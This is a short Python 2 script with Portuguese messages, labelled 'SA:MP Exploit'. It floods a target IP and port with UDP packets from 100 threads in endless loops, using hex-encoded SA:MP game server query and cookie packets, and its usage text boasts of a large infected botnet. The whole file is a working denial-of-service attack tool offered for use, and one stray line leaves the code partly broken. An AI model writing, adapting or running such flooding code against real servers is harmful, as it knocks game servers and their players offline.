import socket
import struct
import codecs,sys
import threading
import random
import time
import os


def usage():
        print '---------------------------------------------------'
        print ' +de 50.000 BOTNETS INFECTADOS.'
        print ' +de 150k Zombies Bots '
        print ' Use python2 botnet.py <URL> Thanks :3 '
        print "\a"
print \

ip = sys.argv[1]
port = sys.argv[2]
orgip =ip

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"),#cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       ]


print("Ataque iniciado no ip: %s e Porta: %s"%(orgip,port))

           


class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
                
                msg = Pacotes[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))                

if __name__ == '__main__':
    try:
     for x in range(100):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
         print('#########################################################################')
         print('SA:MP Exploit')
         print('#########################################################################')
         print('\n\n')
         print('Ataque para ip {} foi parado'.format(orgip))
         pass
